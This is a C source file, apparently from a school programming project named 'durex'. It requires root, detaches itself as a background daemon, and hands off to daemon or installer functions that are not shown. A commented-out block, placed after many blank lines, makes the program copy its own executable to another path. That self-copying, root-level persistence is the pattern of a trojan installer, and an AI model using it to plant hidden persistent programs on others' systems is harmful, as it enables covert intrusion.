/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/08 14:20:11 by user42            #+#    #+#             */
/*   Updated: 2022/02/14 15:46:55 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void	daemonize(void)
{
	pid_t		pid;

	// FIRST FORK
	pid = fork();
	if (pid < 0)
		exit(1);
	if (pid > 0)
		exit(0);

	// SET SESSION
	if (setsid() < 0)
		exit(1);
	
	// SECOND FORK
	pid = fork();
	if (pid < 0)
		exit(1);
	if (pid > 0)
		exit(0);
	
	umask(0);
	chdir("/");

	for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--)
		close(x);
}

int		main(int argc, char **argv)
{
	if (geteuid() != 0)
	{
		printf("[X] This program must be run as root.\n");
		exit(1);
	}

	if (argc > 1 && !strcmp(argv[1],"daemon"))
		durex_daemon();
	else
		durex_bin();
	return (0);
}

























/*
int		main(void)
{
	int				n = 0;
	int				fd;
	int				out_fd;
	char			buff[256];
	struct stat		st;
	void			*p;

	n = readlink("/proc/self/exe", buff, 256);
	buff[n] = '\0';
	
	fd = open(buff, O_RDONLY);
	if (fd < 0)
	{
		printf("[x] Binary errored while trying to open itself\n");
		return (1);
	}

	if (fstat(fd, &st) != 0)
	{
		printf("[x] Error while calling fstat\n");
		return (1);
	}

	p = mmap(0, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

	out_fd = open("/home/user42/Projects/durex/copy", O_WRONLY | O_CREAT | O_EXCL, S_IRWXU);
	if (out_fd < 0)
	{
		printf("[x] Can't open the copy\n");
		return (1);
	}
	write(out_fd, p, st.st_size);

	close(fd);
	close(out_fd);


	printf("Hello World!\n");
	return (0);
}
*/
